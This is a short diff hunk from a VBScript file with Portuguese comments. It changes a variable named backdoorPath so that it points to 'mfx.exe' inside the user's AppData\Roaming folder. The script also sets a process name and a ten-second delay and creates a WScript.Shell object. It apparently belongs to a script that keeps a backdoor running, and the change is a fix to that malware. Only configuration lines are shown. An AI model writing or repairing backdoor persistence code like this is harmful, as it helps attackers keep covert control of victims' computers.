@@ -3,7 +3,7 @@ Dim processName, backdoorPath, delay
 
 ' Configuração
 processName = "mfx.exe" ' 
-backdoorPath = "C:\Users\%username%\AppData\Roaming\metas" ' 
+backdoorPath = "C:\Users\%username%\AppData\Roaming\metas\mfx.exe" ' 
 delay = 10000 ' 
 
 Set objShell = CreateObject("WScript.Shell")
